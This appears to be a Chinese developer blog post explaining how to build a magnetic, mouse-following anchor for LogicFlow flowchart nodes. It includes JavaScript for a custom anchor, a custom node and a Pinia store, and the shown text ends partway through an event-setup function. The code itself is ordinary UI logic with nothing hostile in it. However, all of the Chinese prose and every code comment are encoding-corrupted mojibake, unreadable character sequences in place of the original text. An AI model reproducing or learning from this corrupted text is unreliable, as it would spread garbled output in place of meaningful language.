<p>ä»Šæ˜¯2025å¹´12æœˆ28æ—¥ï¼Œè·ç¦»ä¸Šä¸€æ¬¡å†™æ–‡ç« ï¼Œå·²ç»è¿‡å»äº†è¿‘ä¸¤ä¸ªæœˆçš„æ—¶é—´ã€‚è¿™æ®µæ—¶é—´å…¬å¸ä¸šåŠ¡å®åœ¨ç¹å¿™ï¼Œä¸¤ä¸ªæœˆåä¸ªå‘¨æœ«é‡Œæœ‰å››ä¸ªéƒ½è´¡çŒ®ç»™äº†åŠ ç­ï¼Œå°±è¿å¹³æ—¥é‡Œçš„å·¥ä½œæ—¥ä¹Ÿè¢«ç´§å‡‘çš„ä»»åŠ¡å¡«æ»¡ï¼Œå¿™å¾—å‡ ä¹è„šä¸æ²¾åœ°ã€‚ğŸ˜µ</p>
<p>å¥½åœ¨ä¸€ç•ªåŸ‹å¤´è‹¦å¹²åï¼Œæ€»ç®—èƒ½ç¨ç¨å–˜å£æ°”äº†ã€‚æ˜¨å¤©ï¼Œå°ç¼–å»çˆ¬äº†å¹¿å·çš„å—é¦™å±±ğŸŒ„ï¼Œæœ¬ä»¥ä¸ºæ˜¯ä¸€åº§å¹³å¹³æ— å¥‡çš„"å°å±±"ï¼ˆä½äº500ç±³æµ·æ‹”çš„å±±ï¼Œå°ç¼–åŸºæœ¬èƒ½æ— å‹åŠ›é€Ÿé€šï¼Œå˜¿å˜¿ï¼‰ï¼Œæƒ³ä¸åˆ°è¿˜æœ‰æƒŠå–œï¼Œä¸Šå±±çš„è·¯æ˜¯è§„æ•´çš„ç›˜å±±å…¬è·¯ï¼Œæ²¿ç€å…¬è·¯ä¸€è·¯å‘ä¸Šï¼Œå¤§åŠä¸ªå°æ—¶å°±ç™»é¡¶äº†ï¼›ä¸‹å±±æ—¶ï¼Œæˆ‘ä»¬é€‰äº†ä¸€æ¡æ›´é‡è¶£çš„åŸå§‹å°å¾„ï¼Œæœ‰å¯†æ—ã€æœ‰é™¡å¡ï¼Œèµ°èµ·æ¥æ¯”å…¬è·¯æœ‰æ„æ€å¤šäº†ï¼Œå½“ç„¶ï¼Œè¿™æ¡è·¯çº¿æ˜¯æœ‰å‰äººèµ°è¿‡çš„ï¼Œæˆ‘ä»¬è·Ÿç€ç½‘å‹åˆ†äº«çš„è½¨è¿¹ï¼Œå†å¯¹ç…§ç€æ ‘ä¸Šç»‘ç€çš„å°çº¢å¸¦æŒ‡è·¯ï¼Œä¸€è·¯æœ‰æƒŠæ— é™©åœ°é¡ºåˆ©ä¸‹äº†å±±ã€‚ğŸ’¯ éš¾å—çš„æ˜¯ï¼Œæˆ‘ä»¬å¾—æ‰“è½¦å›å±±çš„å¦ä¸€è¾¹æ‹¿è½¦ğŸ˜…ï¼Œä½†æ•´ä½“æ¥è¯´ï¼Œè¿™æ¬¡çˆ¬å±±çš„ä½“éªŒæ•´ä½“å¾ˆæ„‰å¿«~</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bce07358cfd3498c8dd740d40eaa73d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=JpAC9mHJ%2BI35acpbRqo2A3QpW00%3D" alt="ad2235428be6eb20735aae76471b9532.jpg" width="43%" loading="lazy"/> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a25beadd3104b388e2885e04f9ef628~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=awCkhM4Jav8ynGIUvyXwRbOifgg%3D" alt="ca17f1c56d240ea424322b74dadcd4b0.jpg" width="50%" loading="lazy"/></p>
<p>è¨€å½’æ­£ä¼ ï¼Œæœ€è¿‘åŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdidi%2FLogicFlow" target="_blank" title="https://github.com/didi/LogicFlow" ref="nofollow noopener noreferrer">LogicFlow</a> å¼€å‘æµç¨‹å›¾åŠŸèƒ½æ—¶ï¼Œåšäº†ä¸ª<strong>è‡ªå®šä¹‰é”šç‚¹çš„ "å¸é™„" æ•ˆæœï¼šé¼ æ ‡é è¿‘èŠ‚ç‚¹æ—¶ï¼Œé”šç‚¹ä¼šè‡ªåŠ¨å¼¹å‡ºå¹¶çµåŠ¨è·Ÿéšé¼ æ ‡ç§»åŠ¨</strong>ï¼Œè¿™ä¸ªå°æ•ˆæœæŒºæœ‰è¶£çš„ï¼Œåˆ†äº«ç»™å¤§å®¶å‚è€ƒï¼Œæ•ˆæœå¦‚ä¸‹ï¼Œè¯·è¯¸å›æŒ‰éœ€é£Ÿç”¨å“ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e0f973f7e474159a523a12e5cafdc6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=y39UDHWOUcCplMCxmYdrQncLSnk%3D" alt="122901.gif" loading="lazy"/></p>
<h2 data-id="heading-1">éœ€æ±‚èƒŒæ™¯</h2>
<p>åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Ftutorial%2Fget-started" target="_blank" title="https://site.logic-flow.cn/tutorial/get-started" ref="nofollow noopener noreferrer">LogicFlow</a> ä¸­ï¼Œ<strong>é”šç‚¹</strong>æ˜¯é™æ€çš„ï¼Œå›ºå®šåœ¨èŠ‚ç‚¹çš„ä¸Šä¸‹å·¦å³å››ä¸ªä½ç½®ä¸Šï¼Œè¿™å°±å¯¼è‡´äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li><strong>è§†è§‰å¹²æ‰°</strong>ï¼šå¦‚æœä¸€ç›´æ˜¾ç¤ºé”šç‚¹ï¼Œç”»é¢ä¼šæ˜¾å¾—å¾ˆä¹±ã€‚</li>
<li><strong>äº¤äº’å›°éš¾</strong>ï¼šç”¨æˆ·å¿…é¡»ç²¾ç¡®ç‚¹å‡»åˆ°é”šç‚¹æ‰èƒ½å¼€å§‹è¿çº¿ï¼Œå®¹é”™ç‡ä½ã€‚</li>
</ol>
<blockquote>
<p>å…¶å®...å°±æ˜¯äº§å“ç»ç†è¦æ±‚è¦ç‚«é…·ä¸€ç‚¹ğŸ˜£ï¼Œè¦æˆ‘è¯´é™æ€çš„æŒºå¥½ï¼Œç›´è§‚ç®€å•ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœæ˜¯ï¼š</p>
<ul>
<li>å¹³æ—¶éšè—é”šç‚¹ï¼Œä¿æŒç•Œé¢æ•´æ´ã€‚</li>
<li>é¼ æ ‡ç§»å…¥èŠ‚ç‚¹åŒºåŸŸæ—¶ï¼Œæ˜¾ç¤ºé”šç‚¹ã€‚</li>
<li><strong>é‡ç‚¹æ¥äº†</strong>ğŸ¯ï¼šå½“é¼ æ ‡åœ¨èŠ‚ç‚¹é™„è¿‘ç§»åŠ¨æ—¶ï¼Œé”šç‚¹åº”è¯¥åƒæœ‰ç£åŠ›ä¸€æ ·ï¼Œè‡ªåŠ¨å¸é™„åˆ°ç¦»é¼ æ ‡æœ€è¿‘çš„ä½ç½®ï¼ˆæˆ–è€…è·Ÿéšé¼ æ ‡åœ¨ä¸€å®šèŒƒå›´å†…ç§»åŠ¨ï¼‰ï¼Œè®©è¿çº¿å˜å¾—éšæ‰‹å¯å¾—ã€‚</li>
</ul>
<h2 data-id="heading-2">å…·ä½“å®ç°</h2>
<p>è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦æ·±å…¥ LogicFlow çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Ftutorial%2Fbasic%2Fnode%23%25E8%2587%25AA%25E5%25AE%259A%25E4%25B9%2589%25E8%258A%2582%25E7%2582%25B9" target="_blank" title="https://site.logic-flow.cn/tutorial/basic/node#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%8A%82%E7%82%B9" ref="nofollow noopener noreferrer">è‡ªå®šä¹‰æœºåˆ¶</a>ã€‚</p>
<p>è¿™æ¬¡ä¸»è¦å›´ç»•åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li><code>customNode.js</code>: è‡ªå®šä¹‰èŠ‚ç‚¹ï¼Œç”¨äºé›†æˆæˆ‘ä»¬å†™å¥½çš„è¶…çº§é”šç‚¹ã€‚</li>
<li><code>customAnchor.js</code>: æ ¸å¿ƒé€»è¾‘ï¼Œå®ç°é”šç‚¹çš„æ¸²æŸ“å’Œé¼ æ ‡è·Ÿéšé€»è¾‘ã€‚</li>
</ul>
<h3 data-id="heading-3">ç¬¬1ï¸âƒ£æ­¥ï¼šè‡ªå®šä¹‰é”šç‚¹ç»„ä»¶</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„é”šç‚¹æ¸²æŸ“å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ª SVG å…ƒç´ ï¼ˆè¿™é‡Œç”¨ LogicFlowå†…ç½®çš„ <code>h</code> å‡½æ•°æ¥åˆ›å»ºï¼‰ï¼Œå¹¶ä¸”åŒ…å«å¤æ‚çš„äº¤äº’é€»è¾‘ã€‚</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦è¿”å›ä¸€ä¸ª SVG å…ƒç´ ï¼Ÿ</p>
<p>è¿™å¾—è¯´åˆ° LogicFlow çš„åº•å±‚æŠ€æœ¯é€‰å‹é—®é¢˜äº†ï¼Œå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://juejin.cn/post/7443804823886446631" target="_blank" title="https://juejin.cn/post/7443804823886446631">ä¼ é€é—¨</a></p>
</blockquote>
<p>å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šåˆ›å»ºä¸€ä¸ªè¾ƒå¤§çš„é€æ˜å®¹å™¨ï¼ˆ<code>container</code>ï¼‰ï¼Œç”¨æ¥æ•è·é¼ æ ‡äº‹ä»¶ã€‚åœ¨è¿™ä¸ªå®¹å™¨å†…ï¼Œæˆ‘ä»¬æ”¾ä¸€ä¸ª"å°çƒ"ï¼ˆ<code>ballGroup</code>ï¼‰ï¼Œè¿™ä¸ªå°çƒå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„é”šç‚¹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customAnchor.js</span>
<span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;

<span class="hljs-comment">// å®šä¹‰ä¸€äº›å¸¸é‡ï¼Œæ–¹ä¾¿è°ƒæ•´æ‰‹æ„Ÿ</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONTAINER_WIDTH</span> = <span class="hljs-number">72</span>;  <span class="hljs-comment">// æ„Ÿåº”åŒºåŸŸå®½åº¦</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> = <span class="hljs-number">80</span>; <span class="hljs-comment">// æ„Ÿåº”åŒºåŸŸé«˜åº¦</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BALL_SIZE</span> = <span class="hljs-number">20</span>;        <span class="hljs-comment">// é”šç‚¹å°çƒå¤§å°</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@name</span> åˆ›å»ºå¤æ‚åŠ¨æ•ˆé”šç‚¹
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} params å‚æ•°å¯¹è±¡
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} LogicFlow å¯ç”¨çš„é”šç‚¹æ¸²æŸ“å½¢çŠ¶
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createCustomAnchor</span>(<span class="hljs-params">params</span>) {
  <span class="hljs-keyword">const</span> { x, y, side, id, nodeModel, graphModel } = params || {};
  
  <span class="hljs-comment">// ä¾æ®å·¦å³ä¸¤ä¾§è®¡ç®—å®¹å™¨å·¦ä¸Šè§’ (å°ç¼–çš„ä¸šåŠ¡ä¸­æœ€å¤šä»…åªæœ‰å·¦å³ä¸¤ä¸ªé”šç‚¹)</span>
  <span class="hljs-keyword">const</span> halfW = <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
  <span class="hljs-comment">// å¦‚æœæ˜¯å·¦ä¾§é”šç‚¹ï¼Œå®¹å™¨åº”è¯¥å¾€å·¦åï¼›å³ä¾§åŒç†ï¼ˆå¯æ ¹æ®è‡ªå·±éœ€æ±‚è°ƒæ•´ï¼Œå°ç¼–çš„ä¸šåŠ¡æ˜¯åŒä¸€æ—¶é—´ä»…éœ€å±•ç¤ºä¸€è¾¹çš„é”šç‚¹å³å¯ï¼‰</span>
  <span class="hljs-keyword">const</span> offsetX = side === <span class="hljs-string">"left"</span> ? -halfW : halfW;
  
  <span class="hljs-comment">// è®¡ç®—é€æ˜å®¹å™¨åœ¨ç”»å¸ƒä¸Šçš„ç»å¯¹åæ ‡</span>
  <span class="hljs-keyword">const</span> containerX = x + offsetX - <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
  <span class="hljs-keyword">const</span> containerY = y - <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> / <span class="hljs-number">2</span>;

  <span class="hljs-comment">// DOM å¼•ç”¨ï¼Œç”¨äºåç»­ç›´æ¥æ“ä½œ DOM æå‡æ€§èƒ½</span>
  <span class="hljs-keyword">let</span> containerRef = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">let</span> ballGroupRef = <span class="hljs-literal">null</span>;

  <span class="hljs-comment">// æ ¸å¿ƒé€»è¾‘ï¼šé¼ æ ‡ç§»åŠ¨æ—¶ï¼Œæ›´æ–°å°çƒçš„ä½ç½®</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseMove</span>(<span class="hljs-params">ev</span>) {
    <span class="hljs-keyword">if</span> (!containerRef || !ballGroupRef) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// è·å–å®¹å™¨ç›¸å¯¹äºè§†å£çš„ä½ç½®</span>
    <span class="hljs-keyword">const</span> rect = containerRef.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-comment">// è·å–é¼ æ ‡åœ¨ç”»å¸ƒä¸Šçš„ä½ç½®ï¼ˆè¿™é‡Œéœ€è¦å¤„ç†ä¸€ä¸‹æµè§ˆå™¨å…¼å®¹æ€§ï¼Œç®€å•èµ·è§ç”¨ clientX/Yï¼‰</span>
    <span class="hljs-keyword">const</span> clientX = ev.<span class="hljs-property">clientX</span>;
    <span class="hljs-keyword">const</span> clientY = ev.<span class="hljs-property">clientY</span>;
    
    <span class="hljs-comment">// è®¡ç®—é¼ æ ‡ç›¸å¯¹äºå®¹å™¨å·¦ä¸Šè§’çš„åç§»é‡</span>
    <span class="hljs-keyword">let</span> relX = clientX - rect.<span class="hljs-property">left</span>; 
    <span class="hljs-keyword">let</span> relY = clientY - rect.<span class="hljs-property">top</span>;
    
    <span class="hljs-comment">// å…³é”®ç‚¹ï¼šé™åˆ¶å°çƒåœ¨å®¹å™¨å†…ç§»åŠ¨ï¼Œé˜²æ­¢è·‘å‡ºæ„Ÿåº”åŒº</span>
    relX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-variable constant_">CONTAINER_WIDTH</span>, relX));
    relY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-variable constant_">CONTAINER_HEIGHT</span>, relY));
    
    <span class="hljs-comment">// ä½¿ç”¨ setAttribute ç›´æ¥æ›´æ–° transformï¼Œæ€§èƒ½æœ€å¥½</span>
    ballGroupRef.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"transform"</span>, <span class="hljs-string">`translate(<span class="hljs-subst">${containerX + relX}</span>, <span class="hljs-subst">${containerY + relY}</span>)`</span>);
  }
  
  <span class="hljs-comment">// é¼ æ ‡ç§»å…¥ï¼šå˜è‰² + æ¿€æ´»åŠ¨ç”»</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseEnter</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!ballGroupRef) <span class="hljs-keyword">return</span>;
    ballGroupRef.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">"transform 140ms ease"</span>;
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ”¹å˜é¢œè‰²ï¼Œä¾‹å¦‚ ballGroupRef.style.color = 'red';</span>
  }

  <span class="hljs-comment">// é¼ æ ‡ç§»å‡ºï¼šå¤ä½</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseLeave</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!ballGroupRef) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// é¼ æ ‡ç¦»å¼€æ—¶ï¼Œå¹³æ»‘å›åˆ°å®¹å™¨ä¸­å¿ƒ</span>
    ballGroupRef.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">"transform 160ms ease, opacity 320ms ease"</span>;
    
    <span class="hljs-comment">// è®¡ç®—ä¸­å¿ƒä½ç½®</span>
    <span class="hljs-keyword">const</span> centerX = containerX + <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">const</span> centerY = containerY + <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> / <span class="hljs-number">2</span>;
    ballGroupRef.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"transform"</span>, <span class="hljs-string">`translate(<span class="hljs-subst">${centerX}</span>, <span class="hljs-subst">${centerY}</span>)`</span>);
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-string">"g"</span>, {}, [
    <span class="hljs-comment">// 1. é€æ˜å®¹å™¨ï¼šç”¨äºæ‰©å¤§æ„Ÿåº”åŒºåŸŸï¼Œè¿™å°±æ˜¯â€œå¸é™„â€çš„ç§˜å¯†</span>
    <span class="hljs-title function_">h</span>(<span class="hljs-string">"rect"</span>, {
      <span class="hljs-attr">x</span>: containerX,
      <span class="hljs-attr">y</span>: containerY,
      <span class="hljs-attr">width</span>: <span class="hljs-variable constant_">CONTAINER_WIDTH</span>,
      <span class="hljs-attr">height</span>: <span class="hljs-variable constant_">CONTAINER_HEIGHT</span>,
      <span class="hljs-attr">fill</span>: <span class="hljs-string">"transparent"</span>, <span class="hljs-comment">// å¿…é¡»æ˜¯é€æ˜ä½†å­˜åœ¨çš„</span>
      <span class="hljs-attr">cursor</span>: <span class="hljs-string">"crosshair"</span>,
      <span class="hljs-attr">onMouseEnter</span>: handleMouseEnter,
      <span class="hljs-attr">onMouseMove</span>: handleMouseMove, <span class="hljs-comment">// ç»‘å®šç§»åŠ¨äº‹ä»¶</span>
      <span class="hljs-attr">onMouseLeave</span>: handleMouseLeave,
      <span class="hljs-comment">// ... ç»‘å®šå…¶ä»–äº‹ä»¶ ...</span>
    }),
    
    <span class="hljs-comment">// 2. å®é™…æ˜¾ç¤ºçš„é”šç‚¹ï¼ˆå°çƒï¼‰</span>
    <span class="hljs-title function_">h</span>(<span class="hljs-string">"g"</span>, {
        <span class="hljs-comment">// åˆå§‹ä½ç½®å±…ä¸­</span>
        <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${containerX + CONTAINER_WIDTH / <span class="hljs-number">2</span>}</span>, <span class="hljs-subst">${containerY + CONTAINER_HEIGHT / <span class="hljs-number">2</span>}</span>)`</span>,
        <span class="hljs-string">"pointer-events"</span>: <span class="hljs-string">"none"</span>, <span class="hljs-comment">// è®©é¼ æ ‡äº‹ä»¶ç©¿é€åˆ°ä¸‹æ–¹çš„ rect ä¸Š</span>
        <span class="hljs-attr">ref</span>: <span class="hljs-function">(<span class="hljs-params">el</span>) =&gt;</span> { ballGroupRef = el; }
      },
      [ 
        <span class="hljs-comment">// è¿™é‡Œç”»ä¸€ä¸ªåœ†å½¢å’Œä¸€ä¸ªåŠ å·</span>
        <span class="hljs-title function_">h</span>(<span class="hljs-string">"circle"</span>, { <span class="hljs-attr">r</span>: <span class="hljs-variable constant_">BALL_SIZE</span> / <span class="hljs-number">2</span>, <span class="hljs-attr">stroke</span>: <span class="hljs-string">"currentColor"</span>, <span class="hljs-attr">fill</span>: <span class="hljs-string">"none"</span> }),
        <span class="hljs-title function_">h</span>(<span class="hljs-string">"path"</span>, { <span class="hljs-attr">d</span>: <span class="hljs-string">"M-5 0 L5 0 M0 -5 L0 5"</span>, <span class="hljs-attr">stroke</span>: <span class="hljs-string">"currentColor"</span> })
      ]
    ),
  ]);
}
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ªå°æŠ€å·§â°ï¼šæˆ‘ä»¬å¹¶æ²¡æœ‰ç›´æ¥æ”¹å˜ SVG çš„ <code>cx/cy</code>ï¼Œè€Œæ˜¯é€šè¿‡ <code>transform: translate(...)</code> æ¥ç§»åŠ¨æ•´ä¸ªé”šç‚¹ç»„ï¼Œè¿™æ ·æ€§èƒ½æ›´å¥½ï¼ŒåŠ¨ç”»ä¹Ÿæ›´æµç•…ã€‚åŒæ—¶ï¼Œ<code>pointer-events: none</code> ç¡®ä¿äº†é¼ æ ‡äº‹ä»¶å§‹ç»ˆç”±åº•å±‚çš„é€æ˜ <code>rect</code> è§¦å‘ï¼Œé¿å…é—ªçƒã€‚</p>
<h3 data-id="heading-4">ç¬¬2ï¸âƒ£æ­¥ï¼šåœ¨è‡ªå®šä¹‰èŠ‚ç‚¹ä¸­ä½¿ç”¨</h3>
<p>å†™å¥½äº†é”šç‚¹é€»è¾‘ï¼Œæ¥ä¸‹æ¥è¦åœ¨èŠ‚ç‚¹ä¸­ç”¨èµ·æ¥ï¼Œå’±ä»¬éœ€è¦åœ¨è‡ªå®šä¹‰èŠ‚ç‚¹ç±»ä¸­é‡å†™ <code>getAnchorShape</code> æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customNode.js</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">HtmlNode</span>, <span class="hljs-title class_">HtmlNodeModel</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;
<span class="hljs-keyword">import</span> { createCustomAnchor } <span class="hljs-keyword">from</span> <span class="hljs-string">"./customAnchor"</span>;

<span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹ View</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomNodeView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HtmlNode</span> {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@name</span> è‡ªå®šä¹‰èŠ‚ç‚¹é”šç‚¹å½¢çŠ¶
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} anchorData é”šç‚¹æ•°æ®
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">object</span>} é”šç‚¹å½¢çŠ¶å¯¹è±¡
   */</span>
  <span class="hljs-title function_">getAnchorShape</span>(<span class="hljs-params">anchorData</span>) {
    <span class="hljs-keyword">const</span> { x, y, name, id } = anchorData;
    
    <span class="hljs-comment">// ç®€å•çš„ä¸šåŠ¡é€»è¾‘ï¼šåªæ˜¾ç¤ºå·¦å³ä¸¤ä¾§çš„é”šç‚¹</span>
    <span class="hljs-keyword">const</span> side = name === <span class="hljs-string">"left"</span> ? <span class="hljs-string">"left"</span> : <span class="hljs-string">"right"</span>;
    
    <span class="hljs-comment">// è°ƒç”¨æˆ‘ä»¬åˆšæ‰å†™çš„ç¥å™¨ï¼ä¼ å…¥å¿…è¦çš„å‚æ•°</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">createCustomAnchor</span>({
      x,
      y,
      side,
      id,
      <span class="hljs-attr">nodeModel</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">model</span>,
      <span class="hljs-attr">graphModel</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">graphModel</span>,
    });
  }
}

<span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹ Model</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomNodeModel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HtmlNodeModel</span> {
  <span class="hljs-comment">// å®šä¹‰é”šç‚¹ä½ç½®</span>
  <span class="hljs-title function_">getDefaultAnchor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { id, width, x, y } = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> [
      { <span class="hljs-attr">x</span>: x - width / <span class="hljs-number">2</span>, y, <span class="hljs-attr">name</span>: <span class="hljs-string">"left"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">`<span class="hljs-subst">${id}</span>-L`</span> },
      { <span class="hljs-attr">x</span>: x + width / <span class="hljs-number">2</span>, y, <span class="hljs-attr">name</span>: <span class="hljs-string">"right"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">`<span class="hljs-subst">${id}</span>-R`</span> },
    ];
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"custom-node"</span>,
  <span class="hljs-attr">view</span>: <span class="hljs-title class_">CustomNodeView</span>,
  <span class="hljs-attr">model</span>: <span class="hljs-title class_">CustomNodeModel</span>,
};
</code></pre>
<h3 data-id="heading-5">ç¬¬3ï¸âƒ£æ­¥ï¼šè®°å½•æ‹–æ‹½çŠ¶æ€</h3>
<p>åœ¨å®ç°â€œæ‰‹åŠ¨è¿çº¿â€ä¹‹å‰ï¼Œæˆ‘ä»¬é¢ä¸´ä¸€ä¸ªå…³é”®é—®é¢˜ï¼šå½“æˆ‘ä»¬åœ¨ç›®æ ‡èŠ‚ç‚¹çš„é”šç‚¹ä¸Šæ¾å¼€é¼ æ ‡æ—¶ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“<strong>è¿çº¿æ˜¯ä»å“ªé‡Œå‘èµ·çš„</strong>ï¼Ÿ</p>
<p>LogicFlow çš„é»˜è®¤è¡Œä¸ºä¸­ï¼Œ<code>customAnchor</code> å¹¶ä¸çŸ¥é“å½“å‰çš„æ‹–æ‹½ä¸Šä¸‹æ–‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©å…¨å±€çŠ¶æ€ç®¡ç†ï¼ˆå°ç¼–ç”¨çš„æ˜¯Vue3ï¼Œæ‰€ä»¥ä½¿ç”¨Piniaåšçš„å…¨å±€æ•°æ®å…±äº«ï¼‰å’Œ LogicFlow çš„äº‹ä»¶ç³»ç»Ÿæ¥ "æ­æ¡¥"ã€‚</p>
<p><strong>1. å®šä¹‰ Store</strong></p>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ°æ–¹å­˜æ”¾â€œå½“å‰æ­£åœ¨æ‹–æ‹½çš„é”šç‚¹ä¿¡æ¯â€ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/logicFlow.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useLogicFlowStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"logicFlow"</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">draggingInfo</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// å­˜å‚¨æ‹–æ‹½ä¸­çš„è¿çº¿ä¿¡æ¯</span>
    <span class="hljs-attr">isManualConnected</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// æ ‡è®°æ˜¯å¦è§¦å‘äº†æ‰‹åŠ¨è¿æ¥</span>
  }),
});
</code></pre>
<p><strong>2. ç›‘å¬ LogicFlow äº‹ä»¶</strong></p>
<p>åœ¨ LogicFlow åˆå§‹åŒ–çš„åœ°æ–¹ï¼Œæˆ‘ä»¬éœ€è¦ç›‘å¬ <code>anchor:dragstart</code> å’Œ <code>anchor:dragend</code> äº‹ä»¶ï¼Œå®æ—¶æ›´æ–° Storeã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useLogicFlowStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/stores/logicFlow"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initEvents</span>(<span class="hljs-params">lf</span>) {
  <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useLogicFlowStore</span>();

